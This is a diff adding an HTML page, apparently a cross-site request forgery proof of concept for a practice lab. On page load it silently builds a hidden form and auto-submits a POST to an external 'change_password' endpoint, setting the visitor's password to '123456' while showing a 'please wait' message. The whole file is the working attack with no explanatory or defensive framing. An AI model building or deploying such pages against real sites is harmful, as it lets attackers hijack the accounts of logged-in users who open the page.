@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <title>密码修改</title>
+
+</head>
+
+<body>
+
+    <script>
+
+        // 页面加载后自动提交POST请求
+
+        window.onload = function() {
+
+            // 目标URL
+
+            const url = 'http://9yh0ns5.haobachang1.loveli.com.cn:8888/change_password';
+
+            
+
+            // 创建并提交表单
+
+            const form = document.createElement('form');
+
+            form.method = 'POST';
+
+            form.action = url;
+
+            form.style.display = 'none';
+
+            
+
+            // 添加密码字段
+
+            const input = document.createElement('input');
+
+            input.type = 'hidden';
+
+            input.name = 'new_password';
+
+            input.value = '123456';
+
+            
+
+            form.appendChild(input);
+
+            document.body.appendChild(form);
+
+            
+
+            // 提交表单
+
+            form.submit();
+
+        };
+
+    </script>
+
+    
+
+    <p>正在提交密码修改请求，请稍候...</p>
+
+</body>
+
+</html>
